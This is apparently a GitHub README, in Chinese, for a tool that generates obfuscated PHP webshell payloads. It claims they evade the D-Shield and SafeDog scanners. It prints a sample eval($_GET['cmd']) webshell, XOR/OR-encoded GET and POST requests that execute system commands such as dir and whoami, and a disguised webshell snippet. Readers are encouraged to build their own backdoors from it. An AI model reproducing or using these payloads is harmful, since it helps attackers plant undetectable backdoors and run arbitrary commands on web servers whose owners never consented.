# 前言

复习PHP命令执行，免杀是躲不掉的；所以看了很多巨佬的干货后，总结了下经验，写了这么一个工具

第一次发GitHub....说明文档存在缺陷或工具存在BUG请及时提出~

由于用到的冷门Py包太多，避免环境问题就直接打包成了EXE，直接运行就好（非常幼稚的程序）

# 结果

合理使用工具生成的Payload，是能过最新的D盾和安全狗的

![image-20211123144015380](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/PHP下WebShell混淆Payload/1.png)

# 功能

生成常规字符串，但是由**非敏感字符、非边界符与非字母**经过异或、或、与、取反运算后得到；方便你进行各种骚操作~

小Tips：

```
PHP5的免杀十分灵活，在此不做多解释，参考链接全都是。

PHP7重点在于对$_GET等这类极度敏感的变量隐藏，而不是函数的隐藏（也没有必要）

函数执行基本围绕:

(可变函数名)(参数)
${可变函数名}[参数]
${可变函数名}{参数}
...
你当然可以使用注释提取，本地变量注册等精湛技艺，或者安心找更冷门的回调函数...
```

一个小示例，测试马

```php
<?php
eval($_GET['cmd']);
?>
```

然后可以用工具根据你输入的命令与参数，生成混淆后的形参

```http
http://192.168.85.139/?cmd=${("%5E%5E%40%0B"^"%01%19%05_")}{%ff}(("%04"|"%60").("%60"|"%09").("%12"|"%60"));&%ff=system
```

实际上PHP执行的命令就是

> eval(system(dir);)

![image-20211123160641617](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/PHP下WebShell混淆Payload/2.png)

同时你完全可以把它改成一个马~比如:

```php
$a=urldecode("%7B%7B%5C_")^urldecode("%24%3C%19%0B");
$b=${$a}{'0xff'};
eval("\t".$b);
```

# 使用注意

--- ---

A模式根据你的命令与参数生成完整的混淆参数，B模式单纯对某个字符串进行混淆

-- ---

长格式类似

```
('aaa'^'bbb')
```

短格式类似

```
('a'^'b').('b'^'c')
```

--- ---

取反必须为`not`和`~`

--- ---

由于全随机性异或选取（不可避免），会导致一定程度的错误生成；所以在你正式使用之前请务必本地测试效果后再用！

--- ---

选择下标从1开始

--- ---

最后，因为时间匆忙没有做完美的异常处理，一旦造成任何错误（比如只有18种但你输了20）请强制退出再重开-=-

# 示例

（具体改成什么样的马请发挥你的想象，嘿嘿）

还是这个测试马

```php
<?php
eval($_GET['cmd']);
?>
```

之前介绍了GET方法，假如要使用POST呢，比如要执行system(whoami)

生成这个

```
${("%5E%5E4-/"^"%01%0E%7B~%7B")}{%ff}(("7"|"%60").("%60"|"%08").("/"|"%60").("%21"|"%40").("%60"|"%0D").("%60"|"%09"));&%ff=system
```

![image-20211123215215046](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/PHP下WebShell混淆Payload/3.png)

然后改成这样，通过BP发包

```http
POST /?cmd=${("%5E%5E4-/"^"%01%0E%7B~%7B")}{%ff}(("7"|"%60").("%60"|"%08").("/"|"%60").("%21"|"%40").("%60"|"%0D").("%60"|"%09")); HTTP/1.1
Host: 192.168.85.128
...
Content-Length: 10

%ff=system
```

命令执行成功

![image-20211123220213671](https://wwf-image.oss-cn-hangzhou.aliyuncs.com/自写工具/PHP下WebShell混淆Payload/4.png)







# 参考链接

[独特的免杀思路](http://uuzdaisuki.com/2021/05/11/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6php%E7%AF%87/)

[PHP7后的免杀思路](https://www.anquanke.com/post/id/193787)

[较全的PHP5、PHP7免杀浅谈](https://www.freebuf.com/articles/network/279563.html)

[国光的PHPWebshell免杀总结](https://www.sqlsec.com/2020/07/shell.html#toc-heading-24)

[Windows与Linux的Apache安装](https://cloud.tencent.com/developer/article/1698069)

[P神的无字母数字WebShell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list)

[P神的无字母数字Webshell续](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list)

还有一些博客在查阅资料时疏于记录，但同样给予了重大改进；在此表达真挚的感谢！